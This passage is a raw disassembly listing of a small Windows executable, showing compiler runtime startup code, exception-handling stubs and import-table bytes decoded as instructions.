  4018d0:	add    esp,0x8
  4018d3:	test   eax,eax
  4018d5:	je     0x401911
  4018d7:	mov    eax,DWORD PTR [eax+0x24]
  4018da:	shr    eax,0x1f
  4018dd:	not    eax
  4018df:	and    eax,0x1
  4018e2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4018e9:	mov    ecx,DWORD PTR [ebp-0x10]
  4018ec:	mov    DWORD PTR fs:0x0,ecx
  4018f3:	pop    ecx
  4018f4:	pop    edi
  4018f5:	pop    esi
  4018f6:	pop    ebx
  4018f7:	mov    esp,ebp
  4018f9:	pop    ebp
  4018fa:	ret    
  4018fb:	mov    eax,DWORD PTR [ebp-0x14]
  4018fe:	mov    eax,DWORD PTR [eax]
  401900:	xor    ecx,ecx
  401902:	cmp    DWORD PTR [eax],0xc0000005
  401908:	sete   cl
  40190b:	mov    eax,ecx
  40190d:	ret    
  40190e:	mov    esp,DWORD PTR [ebp-0x18]
  401911:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401918:	xor    eax,eax
  40191a:	mov    ecx,DWORD PTR [ebp-0x10]
  40191d:	mov    DWORD PTR fs:0x0,ecx
  401924:	pop    ecx
  401925:	pop    edi
  401926:	pop    esi
  401927:	pop    ebx
  401928:	mov    esp,ebp
  40192a:	pop    ebp
  40192b:	ret    
  40192c:	int3   
  40192d:	int3   
  40192e:	int3   
  40192f:	int3   
  401930:	int3   
  401931:	int3   
  401932:	int3   
  401933:	int3   
  401934:	int3   
  401935:	int3   
  401936:	int3   
  401937:	int3   
  401938:	int3   
  401939:	int3   
  40193a:	int3   
  40193b:	int3   
  40193c:	int3   
  40193d:	int3   
  40193e:	int3   
  40193f:	int3   
  401940:	mov    edi,edi
  401942:	push   ebp
  401943:	mov    ebp,esp
  401945:	mov    eax,DWORD PTR [ebp+0x8]
  401948:	mov    ecx,0x5a4d
  40194d:	cmp    WORD PTR [eax],cx
  401950:	je     0x401956
  401952:	xor    eax,eax
  401954:	pop    ebp
  401955:	ret    
  401956:	mov    ecx,DWORD PTR [eax+0x3c]
  401959:	add    ecx,eax
  40195b:	xor    eax,eax
  40195d:	cmp    DWORD PTR [ecx],0x4550
  401963:	jne    0x401971
  401965:	mov    edx,0x10b
  40196a:	cmp    WORD PTR [ecx+0x18],dx
  40196e:	sete   al
  401971:	pop    ebp
  401972:	ret    
  401973:	int3   
  401974:	int3   
  401975:	int3   
  401976:	int3   
  401977:	int3   
  401978:	mov    edi,edi
  40197a:	push   ebp
  40197b:	mov    ebp,esp
  40197d:	sub    esp,0x14
  401980:	and    DWORD PTR [ebp-0xc],0x0
  401984:	and    DWORD PTR [ebp-0x8],0x0
  401988:	mov    eax,ds:0x402004
  40198d:	push   esi
  40198e:	push   edi
  40198f:	mov    edi,0xbb40e64e
  401994:	mov    esi,0xffff0000
  401999:	cmp    eax,edi
  40199b:	je     0x4019aa
  40199d:	test   esi,eax
  40199f:	je     0x4019aa
  4019a1:	not    eax
  4019a3:	mov    ds:0x402008,eax
  4019a8:	jmp    0x401a14
  4019aa:	lea    eax,[ebp-0xc]
  4019ad:	push   eax
  4019ae:	call   DWORD PTR ds:0x403044
  4019b4:	mov    eax,DWORD PTR [ebp-0x8]
  4019b7:	xor    eax,DWORD PTR [ebp-0xc]
  4019ba:	mov    DWORD PTR [ebp-0x4],eax
  4019bd:	call   DWORD PTR ds:0x40302c
  4019c3:	xor    DWORD PTR [ebp-0x4],eax
  4019c6:	call   DWORD PTR ds:0x403028
  4019cc:	xor    DWORD PTR [ebp-0x4],eax
  4019cf:	call   DWORD PTR ds:0x403048
  4019d5:	xor    eax,DWORD PTR [ebp-0x4]
  4019d8:	lea    ecx,[ebp-0x4]
  4019db:	xor    eax,ecx
  4019dd:	mov    DWORD PTR [ebp-0x4],eax
  4019e0:	lea    eax,[ebp-0x14]
  4019e3:	push   eax
  4019e4:	call   DWORD PTR ds:0x403034
  4019ea:	mov    eax,DWORD PTR [ebp-0x10]
  4019ed:	xor    eax,DWORD PTR [ebp-0x14]
  4019f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4019f3:	xor    ecx,eax
  4019f5:	cmp    ecx,edi
  4019f7:	je     0x401a01
  4019f9:	test   DWORD PTR ds:0x402004,esi
  4019ff:	jne    0x401a06
  401a01:	mov    ecx,0xbb40e64f
  401a06:	mov    DWORD PTR ds:0x402004,ecx
  401a0c:	not    ecx
  401a0e:	mov    DWORD PTR ds:0x402008,ecx
  401a14:	pop    edi
  401a15:	pop    esi
  401a16:	mov    esp,ebp
  401a18:	pop    ebp
  401a19:	ret    
  401a1a:	int3   
  401a1b:	int3   
  401a1c:	int3   
  401a1d:	int3   
  401a1e:	int3   
  401a1f:	push   0x30000
  401a24:	push   0x10000
  401a29:	call   DWORD PTR ds:0x403054
  401a2f:	pop    ecx
  401a30:	pop    ecx
  401a31:	ret    
  401a32:	int3   
  401a33:	int3   
  401a34:	int3   
  401a35:	int3   
  401a36:	int3   
  401a37:	int3   
  401a38:	jmp    DWORD PTR ds:0x403060
  401a3e:	int3   
  401a3f:	int3   
  401a40:	int3   
  401a41:	int3   
  401a42:	int3   
  401a43:	int3   
  401a44:	push   0x401aa0
  401a49:	push   DWORD PTR fs:0x0
  401a50:	mov    eax,DWORD PTR [esp+0x10]
  401a54:	mov    DWORD PTR [esp+0x10],ebp
  401a58:	lea    ebp,[esp+0x10]
  401a5c:	sub    esp,eax
  401a5e:	push   ebx
  401a5f:	push   esi
  401a60:	push   edi
  401a61:	mov    eax,ds:0x402004
  401a66:	xor    DWORD PTR [ebp-0x4],eax
  401a69:	xor    eax,ebp
  401a6b:	mov    DWORD PTR [ebp-0x1c],eax
  401a6e:	push   eax
  401a6f:	mov    DWORD PTR [ebp-0x18],esp
  401a72:	push   DWORD PTR [ebp-0x8]
  401a75:	mov    eax,DWORD PTR [ebp-0x4]
  401a78:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401a7f:	mov    DWORD PTR [ebp-0x8],eax
  401a82:	lea    eax,[ebp-0x10]
  401a85:	mov    fs:0x0,eax
  401a8b:	ret    
  401a8c:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a8f:	xor    ecx,ebp
  401a91:	call   0x4016c0
  401a96:	jmp    0x401c61
  401a9b:	int3   
  401a9c:	int3   
  401a9d:	int3   
  401a9e:	int3   
  401a9f:	int3   
  401aa0:	mov    edi,edi
  401aa2:	push   ebp
  401aa3:	mov    ebp,esp
  401aa5:	push   DWORD PTR [ebp+0x14]
  401aa8:	push   DWORD PTR [ebp+0x10]
  401aab:	push   DWORD PTR [ebp+0xc]
  401aae:	push   DWORD PTR [ebp+0x8]
  401ab1:	push   0x4016c0
  401ab6:	push   0x402004
  401abb:	call   0x401c7a
  401ac0:	add    esp,0x18
  401ac3:	pop    ebp
  401ac4:	ret    
  401ac5:	int3   
  401ac6:	int3   
  401ac7:	int3   
  401ac8:	int3   
  401ac9:	int3   
  401aca:	int3   
  401acb:	int3   
  401acc:	int3   
  401acd:	int3   
  401ace:	int3   
  401acf:	int3   
  401ad0:	ret    
  401ad1:	int3   
  401ad2:	int3   
  401ad3:	int3   
  401ad4:	int3   
  401ad5:	int3   
  401ad6:	mov    edi,edi
  401ad8:	push   ebp
  401ad9:	mov    ebp,esp
  401adb:	push   0x0
  401add:	call   DWORD PTR ds:0x40300c
  401ae3:	push   DWORD PTR [ebp+0x8]
  401ae6:	call   DWORD PTR ds:0x403008
  401aec:	push   0xc0000409
  401af1:	call   DWORD PTR ds:0x403024
  401af7:	push   eax
  401af8:	call   DWORD PTR ds:0x403020
  401afe:	pop    ebp
  401aff:	ret    
  401b00:	int3   
  401b01:	int3   
  401b02:	int3   
  401b03:	int3   
  401b04:	int3   
  401b05:	mov    edi,edi
  401b07:	push   ebp
  401b08:	mov    ebp,esp
  401b0a:	sub    esp,0x324
  401b10:	mov    ds:0x402140,eax
  401b15:	mov    DWORD PTR ds:0x40213c,ecx
  401b1b:	mov    DWORD PTR ds:0x402138,edx
  401b21:	mov    DWORD PTR ds:0x402134,ebx
  401b27:	mov    DWORD PTR ds:0x402130,esi
  401b2d:	mov    DWORD PTR ds:0x40212c,edi
  401b33:	data16 mov WORD PTR ds:0x402158,ss
  401b3a:	data16 mov WORD PTR ds:0x40214c,cs
  401b41:	data16 mov WORD PTR ds:0x402128,ds
  401b48:	data16 mov WORD PTR ds:0x402124,es
  401b4f:	data16 mov WORD PTR ds:0x402120,fs
  401b56:	data16 mov WORD PTR ds:0x40211c,gs
  401b5d:	pushf  
  401b5e:	pop    DWORD PTR ds:0x402150
  401b64:	mov    eax,DWORD PTR [ebp+0x0]
  401b67:	mov    ds:0x402144,eax
  401b6c:	mov    eax,DWORD PTR [ebp+0x4]
  401b6f:	mov    ds:0x402148,eax
  401b74:	lea    eax,[ebp+0x8]
  401b77:	mov    ds:0x402154,eax
  401b7c:	mov    eax,DWORD PTR [ebp-0x324]
  401b82:	mov    DWORD PTR ds:0x402090,0x10001
  401b8c:	mov    eax,ds:0x402148
  401b91:	mov    ds:0x40204c,eax
  401b96:	mov    DWORD PTR ds:0x402040,0xc0000409
  401ba0:	mov    DWORD PTR ds:0x402044,0x1
  401baa:	mov    DWORD PTR ds:0x402050,0x3
  401bb4:	push   0x4
  401bb6:	pop    eax
  401bb7:	imul   eax,eax,0x0
  401bba:	mov    DWORD PTR [eax+0x402054],0x2
  401bc4:	push   0x4
  401bc6:	pop    eax
  401bc7:	shl    eax,0x0
  401bca:	mov    ecx,DWORD PTR ds:0x402004
  401bd0:	mov    DWORD PTR [eax+0x402054],ecx
  401bd6:	push   0x4
  401bd8:	pop    eax
  401bd9:	shl    eax,1
  401bdb:	mov    ecx,DWORD PTR ds:0x402008
  401be1:	mov    DWORD PTR [eax+0x402054],ecx
  401be7:	push   0x4
  401be9:	pop    eax
  401bea:	imul   eax,eax,0x0
  401bed:	mov    ecx,DWORD PTR ds:0x402004
  401bf3:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  401bf7:	push   0x4
  401bf9:	pop    eax
  401bfa:	shl    eax,0x0
  401bfd:	mov    ecx,DWORD PTR ds:0x402008
  401c03:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  401c07:	push   0x401040
  401c0c:	call   0x401ad6
  401c11:	mov    esp,ebp
  401c13:	pop    ebp
  401c14:	ret    
  401c15:	int3   
  401c16:	int3   
  401c17:	int3   
  401c18:	int3   
  401c19:	int3   
  401c1a:	int3   
  401c1b:	int3   
  401c1c:	push   0x401aa0
  401c21:	push   DWORD PTR fs:0x0
  401c28:	mov    eax,DWORD PTR [esp+0x10]
  401c2c:	mov    DWORD PTR [esp+0x10],ebp
  401c30:	lea    ebp,[esp+0x10]
  401c34:	sub    esp,eax
  401c36:	push   ebx
  401c37:	push   esi
  401c38:	push   edi
  401c39:	mov    eax,ds:0x402004
  401c3e:	xor    DWORD PTR [ebp-0x4],eax
  401c41:	xor    eax,ebp
  401c43:	push   eax
  401c44:	mov    DWORD PTR [ebp-0x18],esp
  401c47:	push   DWORD PTR [ebp-0x8]
  401c4a:	mov    eax,DWORD PTR [ebp-0x4]
  401c4d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401c54:	mov    DWORD PTR [ebp-0x8],eax
  401c57:	lea    eax,[ebp-0x10]
  401c5a:	mov    fs:0x0,eax
  401c60:	ret    
  401c61:	mov    ecx,DWORD PTR [ebp-0x10]
  401c64:	mov    DWORD PTR fs:0x0,ecx
  401c6b:	pop    ecx
  401c6c:	pop    edi
  401c6d:	pop    edi
  401c6e:	pop    esi
  401c6f:	pop    ebx
  401c70:	mov    esp,ebp
  401c72:	pop    ebp
  401c73:	push   ecx
  401c74:	ret    
  401c75:	int3   
  401c76:	int3   
  401c77:	int3   
  401c78:	int3   
  401c79:	int3   
  401c7a:	jmp    DWORD PTR ds:0x403050
  401c80:	in     al,0xff
  401c82:	(bad)  
  401c83:	inc    DWORD PTR [eax]
  401c85:	add    BYTE PTR [eax],al
  401c87:	add    BYTE PTR [edi+edi*8+0xffff],al
  401c8e:	add    BYTE PTR [eax],al
  401c90:	(bad)  
  401c91:	(bad)  
  401c92:	(bad)  
  401c93:	push   DWORD PTR [esi]
  401c95:	push   ss
  401c96:	inc    eax
  401c97:	add    BYTE PTR [edx],bh
  401c99:	push   ss
  401c9a:	inc    eax
  401c9b:	add    dh,bh
  401c9d:	(bad)  
  401c9e:	(bad)  
  401c9f:	(bad)  
  401ca0:	jmp    0x4015:0xfe004015
  401ca7:	add    dh,bh
  401ca9:	(bad)  
  401caa:	(bad)  
  401cab:	inc    DWORD PTR [eax]
  401cad:	add    BYTE PTR [eax],al
  401caf:	add    ah,dl
  401cb1:	(bad)  
  401cb2:	(bad)  
  401cb3:	inc    DWORD PTR [eax]
  401cb5:	add    BYTE PTR [eax],al
  401cb7:	add    dh,bh
  401cb9:	(bad)  
  401cba:	(bad)  
  401cbb:	call   FWORD PTR [edi+edx*1+0x17a00040]
  401cc2:	inc    eax
  401cc3:	add    BYTE PTR [eax],al
  401cc5:	add    BYTE PTR [eax],al
  401cc7:	add    dh,bh
  401cc9:	(bad)  
  401cca:	(bad)  
  401ccb:	inc    DWORD PTR [eax]
  401ccd:	add    BYTE PTR [eax],al
  401ccf:	add    al,bl
  401cd1:	(bad)  
  401cd2:	(bad)  
  401cd3:	inc    DWORD PTR [eax]
  401cd5:	add    BYTE PTR [eax],al
  401cd7:	add    dh,bh
  401cd9:	(bad)  
  401cda:	(bad)  
  401cdb:	(bad)  
  401cdc:	sti    
  401cdd:	sbb    BYTE PTR [eax+0x0],al
  401ce0:	push   cs
  401ce1:	sbb    DWORD PTR [eax+0x0],eax

Disassembly of section .data:

00402000 <.data>:
  402000:	add    DWORD PTR [eax],eax
  402002:	add    BYTE PTR [eax],al
  402004:	dec    esi
  402005:	out    0x40,al
  402007:	mov    ebx,0x44bf19b1
	...

Disassembly of section .idata:

00403000 <.idata>:
  403000:	ret    0x32
  403003:	add    BYTE PTR [eax],al
  403005:	add    BYTE PTR [eax],al
  403007:	add    BYTE PTR [edx-0x7ffffcd],bl
  40300d:	xor    al,BYTE PTR [eax]
  40300f:	add    BYTE PTR [eax],al
  403011:	add    BYTE PTR [eax],al
  403013:	add    BYTE PTR [esi],dl
  403015:	xor    eax,DWORD PTR [eax]
  403017:	add    BYTE PTR [eax],al
  403019:	add    BYTE PTR [eax],al
  40301b:	add    dh,ah
  40301d:	xor    al,BYTE PTR [eax]
  40301f:	add    dl,cl
  403021:	xor    eax,DWORD PTR [eax]
  403023:	add    BYTE PTR [esi+0x5a000033],dh
  403029:	xor    eax,DWORD PTR [eax]
  40302b:	add    BYTE PTR [ebx+esi*1+0x0],al
  40302f:	add    BYTE PTR [eax],al
  403031:	add    BYTE PTR [eax],al
  403033:	add    BYTE PTR [edx],ch
  403035:	xor    eax,DWORD PTR [eax]
  403037:	add    BYTE PTR [eax],al
  403039:	add    BYTE PTR [eax],al
  40303b:	add    dh,bl
  40303d:	xor    al,BYTE PTR [eax]
  40303f:	add    BYTE PTR [eax],al
  403041:	add    BYTE PTR [eax],al
  403043:	add    BYTE PTR [eax+0x33],dh
  403046:	add    BYTE PTR [eax],al
  403048:	mov    dh,BYTE PTR [ebx]
  40304a:	add    BYTE PTR [eax],al
  40304c:	add    BYTE PTR [eax],al
  40304e:	add    BYTE PTR [eax],al
  403050:	test   al,0x32
  403052:	add    BYTE PTR [eax],al
  403054:	call   0x32:0x7a000032
  40305b:	add    BYTE PTR [eax+0x32],dh
  40305e:	add    BYTE PTR [eax],al
  403060:	xor    al,BYTE PTR fs:[eax]
  403063:	add    BYTE PTR [eax+0x32],dl
  403066:	add    BYTE PTR [eax],al
  403068:	inc    edx
  403069:	xor    al,BYTE PTR [eax]
  40306b:	add    BYTE PTR [eax],bh
  40306d:	xor    al,BYTE PTR [eax]
  40306f:	add    BYTE PTR [eax],dh
  403071:	xor    al,BYTE PTR [eax]
  403073:	add    BYTE PTR [eax],ch
  403075:	xor    al,BYTE PTR [eax]
  403077:	add    BYTE PTR [esi],dl
  403079:	xor    al,BYTE PTR [eax]
  40307b:	add    BYTE PTR [edx+esi*1],al
  40307e:	add    BYTE PTR [eax],al
  403080:	div    BYTE PTR [ecx]
  403082:	add    BYTE PTR [eax],al
  403084:	out    0x31,al
  403086:	add    BYTE PTR [eax],al
  403088:	fdiv   DWORD PTR [ecx]
  40308a:	add    BYTE PTR [eax],al
  40308c:	add    BYTE PTR [eax],al
  40308e:	add    BYTE PTR [eax],al
  403090:	rcr    BYTE PTR [edx],1
  403092:	inc    eax
  403093:	add    BYTE PTR [eax+0x31],bl
  403099:	add    BYTE PTR [eax],al
  40309b:	add    BYTE PTR [eax],al
  40309d:	add    BYTE PTR [eax],al
  40309f:	add    BYTE PTR [esi+0x50000032],cl
  4030a5:	xor    BYTE PTR [eax],al
  4030a7:	add    BYTE PTR [eax+0x31],cl
	...
  4030b2:	add    BYTE PTR [eax],al
  4030b4:	aam    0x32
  4030b6:	add    BYTE PTR [eax],al
  4030b8:	add    BYTE PTR [eax],dh
  4030ba:	add    BYTE PTR [eax],al
  4030bc:	test   BYTE PTR [ecx],dh
	...
  4030c6:	add    BYTE PTR [eax],al
  4030c8:	fidiv  WORD PTR [ebx]
  4030ca:	add    BYTE PTR [eax],al
  4030cc:	cmp    al,0x30
  4030ce:	add    BYTE PTR [eax],al
  4030d0:	xor    DWORD PTR fs:[eax],eax
	...
  4030db:	add    BYTE PTR [eax],al
  4030dd:	xor    al,0x0
  4030df:	add    BYTE PTR [eax+esi*1],bl
  4030e2:	add    BYTE PTR [eax],al
  4030e4:	push   eax
  4030e5:	xor    DWORD PTR [eax],eax
	...
  4030ef:	add    BYTE PTR [edx],ch
  4030f1:	xor    al,0x0
  4030f3:	add    BYTE PTR [eax],cl
  4030f5:	xor    BYTE PTR [eax],al
  4030f7:	add    BYTE PTR [ecx+esi*1+0x0],bl
	...
  403103:	add    BYTE PTR [esp+esi*1+0x0],dl
  403107:	add    BYTE PTR [eax+esi*1],dl
  40310a:	add    BYTE PTR [eax],al
  40310c:	jl     0x40313f
	...
  403116:	add    BYTE PTR [eax],al
  403118:	jle    0x40314e
  40311a:	add    BYTE PTR [eax],al
  40311c:	xor    al,0x30
  40311e:	add    BYTE PTR [eax],al
  403120:	mov    WORD PTR [ecx],?
	...
  40312a:	add    BYTE PTR [eax],al
  40312c:	mov    ds:0x44000034,al
  403131:	xor    BYTE PTR [eax],al
	...
  403147:	add    dl,al
  403149:	xor    al,BYTE PTR [eax]
  40314b:	add    BYTE PTR [eax],al
  40314d:	add    BYTE PTR [eax],al
  40314f:	add    BYTE PTR [edx-0x7ffffcd],bl
  403155:	xor    al,BYTE PTR [eax]
  403157:	add    BYTE PTR [eax],al
  403159:	add    BYTE PTR [eax],al
  40315b:	add    BYTE PTR [esi],dl
  40315d:	xor    eax,DWORD PTR [eax]
  40315f:	add    BYTE PTR [eax],al
  403161:	add    BYTE PTR [eax],al
  403163:	add    dh,ah
  403165:	xor    al,BYTE PTR [eax]
  403167:	add    dl,cl
  403169:	xor    eax,DWORD PTR [eax]
  40316b:	add    BYTE PTR [esi+0x5a000033],dh
  403171:	xor    eax,DWORD PTR [eax]
  403173:	add    BYTE PTR [ebx+esi*1+0x0],al
  403177:	add    BYTE PTR [eax],al
  403179:	add    BYTE PTR [eax],al
  40317b:	add    BYTE PTR [edx],ch
  40317d:	xor    eax,DWORD PTR [eax]
  40317f:	add    BYTE PTR [eax],al
  403181:	add    BYTE PTR [eax],al
  403183:	add    dh,bl
  403185:	xor    al,BYTE PTR [eax]
  403187:	add    BYTE PTR [eax],al
  403189:	add    BYTE PTR [eax],al
  40318b:	add    BYTE PTR [eax+0x33],dh
  40318e:	add    BYTE PTR [eax],al
  403190:	mov    dh,BYTE PTR [ebx]
  403192:	add    BYTE PTR [eax],al
  403194:	add    BYTE PTR [eax],al
  403196:	add    BYTE PTR [eax],al
  403198:	test   al,0x32
  40319a:	add    BYTE PTR [eax],al
  40319c:	call   0x32:0x7a000032
  4031a3:	add    BYTE PTR [eax+0x32],dh
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	xor    al,BYTE PTR fs:[eax]
  4031ab:	add    BYTE PTR [eax+0x32],dl
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	inc    edx
  4031b1:	xor    al,BYTE PTR [eax]
  4031b3:	add    BYTE PTR [eax],bh
  4031b5:	xor    al,BYTE PTR [eax]
  4031b7:	add    BYTE PTR [eax],dh
  4031b9:	xor    al,BYTE PTR [eax]
  4031bb:	add    BYTE PTR [eax],ch
  4031bd:	xor    al,BYTE PTR [eax]
  4031bf:	add    BYTE PTR [esi],dl
  4031c1:	xor    al,BYTE PTR [eax]
  4031c3:	add    BYTE PTR [edx+esi*1],al
  4031c6:	add    BYTE PTR [eax],al
  4031c8:	div    BYTE PTR [ecx]
  4031ca:	add    BYTE PTR [eax],al
  4031cc:	out    0x31,al
  4031ce:	add    BYTE PTR [eax],al
  4031d0:	fdiv   DWORD PTR [ecx]
  4031d2:	add    BYTE PTR [eax],al
  4031d4:	add    BYTE PTR [eax],al
  4031d6:	add    BYTE PTR [eax],al
  4031d8:	outs   dx,DWORD PTR ds:[esi]
  4031d9:	add    BYTE PTR [edi+0x58],bl
  4031dc:	arpl   WORD PTR [eax+0x74],si
  4031df:	inc    esi
  4031e0:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  4031e8:	pop    edi
  4031e9:	pop    edi
  4031ea:	jo     0x40324b
  4031ec:	pop    edi
  4031ed:	arpl   WORD PTR [edi+0x6d],bp
  4031f0:	ins    DWORD PTR es:[edi],dx
  4031f1:	outs   dx,DWORD PTR ds:[esi]
  4031f2:	fs add BYTE PTR gs:[eax],al
  4031f6:	adc    DWORD PTR [ecx],eax
  4031f8:	pop    edi
  4031f9:	popa   
  4031fa:	ins    DWORD PTR es:[edi],dx
  4031fb:	jae    0x403264
  4031fd:	pop    edi
  4031fe:	gs js  0x40326a
  403201:	je     0x403203
  403203:	add    cl,dh
  403205:	add    BYTE PTR [edi+0x5f],bl
  403208:	ja     0x403271
  40320a:	gs je  0x40327a
  40320d:	popa   
  40320e:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  403215:	add    dl,ah
  403217:	add    BYTE PTR [edi+0x5f],bl
  40321a:	jae    0x403281
  40321c:	je     0x40327d
  40321e:	popa   
  40321f:	jo     0x403291
  403221:	pop    edi
  403222:	je     0x40329d
  403224:	jo     0x40328b
  403226:	add    BYTE PTR [eax],al
  403228:	scas   al,BYTE PTR es:[edi]
  403229:	add    al,0x65
  40322b:	js     0x403296
  40322d:	je     0x40322f
  40322f:	add    BYTE PTR [ebx+0x1],dh
  403232:	pop    edi
  403233:	gs js  0x40329f
  403236:	je     0x403238
  403238:	and    al,0x1
  40323a:	pop    edi
  40323b:	arpl   WORD PTR [ebp+0x78],sp
  40323e:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  403246:	jo     0x4032a7
  403248:	pop    edi
  403249:	ins    WORD PTR es:[edi],dx
  40324b:	outs   dx,DWORD PTR ds:[esi]
  40324c:	fs add BYTE PTR gs:[eax],al
  403250:	in     al,0x0
  403252:	pop    edi
  403253:	pop    edi
  403254:	jae    0x4032bb
  403256:	je     0x4032cd
  403258:	jae    0x4032bf
  40325a:	jb     0x4032c9
  40325c:	popa   
  40325d:	je     0x4032c7
  40325f:	gs jb  0x4032d4
  403262:	add    BYTE PTR [eax],al
  403264:	call   0x6ea9916a
  403269:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x5006d72
  403271:	add    al,0x5f
  403273:	ja     0x4032d8
  403275:	ins    DWORD PTR es:[edi],dx
  403276:	fs ins BYTE PTR es:[edi],dx
  403278:	outs   dx,BYTE PTR ds:[esi]
  403279:	add    BYTE PTR ds:0x65743f00,dh
  40327f:	jb     0x4032ee
  403281:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  403288:	pop    ecx
  403289:	inc    ecx
  40328a:	pop    eax
  40328b:	pop    eax
  40328c:	pop    edx
  40328d:	add    BYTE PTR [ebp+0x73],ch
  403290:	jbe    0x4032f5
  403292:	jb     0x403308
  403294:	cs fs ins BYTE PTR es:[edi],dx
  403297:	ins    BYTE PTR es:[edi],dx
  403298:	add    BYTE PTR [eax],al
  40329a:	aaa    
  40329b:	add    DWORD PTR [edi+0x63],ebx
  40329e:	outs   dx,DWORD PTR ds:[esi]
  40329f:	outs   dx,BYTE PTR ds:[esi]
  4032a0:	je     0x403314
  4032a2:	outs   dx,DWORD PTR ds:[esi]
  4032a3:	ins    BYTE PTR es:[edi],dx
  4032a4:	data16 jo 0x4032a7
  4032a7:	add    BYTE PTR [edx+0x1],ch
  4032aa:	pop    edi
  4032ab:	gs js  0x403311
  4032ae:	gs jo  0x403325
  4032b1:	pop    edi
  4032b2:	push   0x6c646e61
  4032b7:	gs jb  0x4032ee
  4032ba:	pop    edi
  4032bb:	arpl   WORD PTR [edi+0x6d],bp
  4032be:	ins    DWORD PTR es:[edi],dx
  4032bf:	outs   dx,DWORD PTR ds:[esi]
  4032c0:	outs   dx,BYTE PTR ds:[esi]
  4032c1:	add    BYTE PTR [eax],al
  4032c3:	add    BYTE PTR [ecx+ebp*2+0x73],al
  4032c7:	jo     0x403335
  4032c9:	popa   
  4032ca:	jns    0x40331f
  4032cc:	pop    ecx
  4032cd:	push   ebx
  4032ce:	inc    esp
  4032cf:	dec    ebp
  4032d0:	inc    ebx
  4032d1:	push   eax
  4032d2:	dec    esp
  4032d3:	add    BYTE PTR [ebx+0x59],dl
  4032d6:	push   ebx
  4032d7:	inc    esp
  4032d8:	dec    ebp
  4032d9:	cs inc ebx
  4032db:	push   eax
  4032dc:	dec    esp
  4032dd:	add    BYTE PTR ds:0x656c5300,ch
  4032e3:	gs jo  0x4032e6
  4032e6:	and    BYTE PTR [eax],al
  4032e8:	inc    edi
  4032e9:	gs je  0x40333f
  4032ec:	je     0x40334f
  4032ee:	jb     0x403364
  4032f0:	jne    0x403362
  4032f2:	dec    ecx
  4032f3:	outs   dx,BYTE PTR ds:[esi]
  4032f4:	outs   dx,WORD PTR ds:[esi]
  4032f6:	push   edi
  4032f7:	add    BYTE PTR [edi],cl
  4032f9:	add    BYTE PTR [ebx+0x65],dl
  4032fc:	je     0x403353
  4032fe:	outs   dx,BYTE PTR ds:[esi]
  4032ff:	push   0x6c646e61
  403304:	gs fs inc ebp
  403307:	js     0x40336c
  403309:	gs jo  0x403380
  40330c:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  403313:	gs jb  0x403316
  403316:	adc    BYTE PTR [eax],al
  403318:	inc    edi
  403319:	gs je  0x403369
  40331c:	outs   dx,DWORD PTR ds:[esi]
  40331d:	fs jne 0x40338c
  403320:	gs dec eax
  403322:	popa   
  403323:	outs   dx,BYTE PTR ds:[esi]
  403324:	fs ins BYTE PTR es:[edi],dx
  403326:	gs inc ecx
  403328:	add    BYTE PTR [eax],al
  40332a:	add    BYTE PTR [eax],al
  40332c:	push   ecx
  40332d:	jne    0x403394
  40332f:	jb     0x4033aa
  403331:	push   eax
  403332:	gs jb  0x40339b
  403335:	outs   dx,DWORD PTR ds:[esi]
  403336:	jb     0x4033a5
  403338:	popa   
  403339:	outs   dx,BYTE PTR ds:[esi]
  40333a:	arpl   WORD PTR [ebp+0x43],sp
  40333d:	outs   dx,DWORD PTR ds:[esi]
  40333e:	jne    0x4033ae
  403340:	je     0x4033a7
  403342:	jb     0x403344
  403344:	or     eax,0x74654700
  403349:	inc    ebx
  40334a:	jne    0x4033be
  40334c:	jb     0x4033b3
  40334e:	outs   dx,BYTE PTR ds:[esi]
  40334f:	je     0x4033a1
  403351:	jb     0x4033c2
  403353:	arpl   WORD PTR [ebp+0x73],sp
  403356:	jae    0x4033a1
  403358:	add    BYTE PTR fs:[ecx],dl
  40335b:	add    BYTE PTR [edi+0x65],al
  40335e:	je     0x4033a3
  403360:	jne    0x4033d4
  403362:	jb     0x4033c9
  403364:	outs   dx,BYTE PTR ds:[esi]
  403365:	je     0x4033bb
  403367:	push   0x64616572
  40336c:	dec    ecx
  40336d:	add    BYTE PTR fs:[eax],al
  403370:	adc    al,0x0
  403372:	inc    edi
  403373:	gs je  0x4033c9
  403376:	jns    0x4033eb
  403378:	je     0x4033df
  40337a:	ins    DWORD PTR es:[edi],dx
  40337b:	push   esp
  40337c:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  403383:	ins    BYTE PTR es:[edi],dx
  403384:	gs push esp
  403386:	imul   ebp,DWORD PTR [ebp+0x65],0x47001800
  40338d:	gs je  0x4033e4
  403390:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  403397:	je     0x403399
  403399:	add    BYTE PTR [ecx],dl
  40339b:	add    BYTE PTR [ebp+0x6e],dl
  40339e:	push   0x6c646e61
  4033a3:	gs fs inc ebp
  4033a6:	js     0x40340b
  4033a8:	gs jo  0x40341f
  4033ab:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  4033b2:	gs jb  0x4033b5
  4033b5:	add    BYTE PTR [eax+eax*1],cl
  4033b8:	inc    edi
  4033b9:	gs je  0x4033ff
  4033bc:	jne    0x403430
  4033be:	jb     0x403425
  4033c0:	outs   dx,BYTE PTR ds:[esi]
  4033c1:	je     0x403413
  4033c3:	jb     0x403434
  4033c5:	arpl   WORD PTR [ebp+0x73],sp
  4033c8:	jae    0x4033ca
  4033ca:	dec    ebx
  4033cb:	add    BYTE PTR [ebp+eiz*2+0x72],dl
  4033cf:	ins    DWORD PTR es:[edi],dx
  4033d0:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  4033d7:	outs   dx,DWORD PTR ds:[esi]
